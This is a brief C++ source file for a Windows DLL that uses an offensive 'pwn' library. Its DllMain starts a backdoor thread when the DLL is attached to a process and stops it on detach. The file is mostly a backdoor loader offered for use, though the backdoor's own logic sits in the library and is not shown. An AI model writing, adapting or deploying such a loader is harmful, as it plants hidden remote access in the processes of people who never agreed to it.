
#include "pwn.hpp"


using namespace pwn::log;
using namespace pwn::utils::random;
using namespace pwn::backdoor;


void
OnAttachRoutine()
{
    //
    // Initialize the RNG
    //
    pwn::utils::random::seed();

    //
    // Start the backdoor thread
    //
    {
        auto res = pwn::backdoor::start();
        if ( Failed(res) )
        {
            return;
        }
    }
}


void
OnDetachRoutine()
{
    pwn::backdoor::stop();
}


BOOL APIENTRY
DllMain(_In_ HMODULE hModule, _In_ DWORD ul_reason_for_call, _In_ LPVOID lpReserved)
{
    UNREFERENCED_PARAMETER(hModule);
    UNREFERENCED_PARAMETER(lpReserved);

    switch ( ul_reason_for_call )
    {
    case DLL_PROCESS_ATTACH:
        OnAttachRoutine();
        break;

    case DLL_PROCESS_DETACH:
        OnDetachRoutine();
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
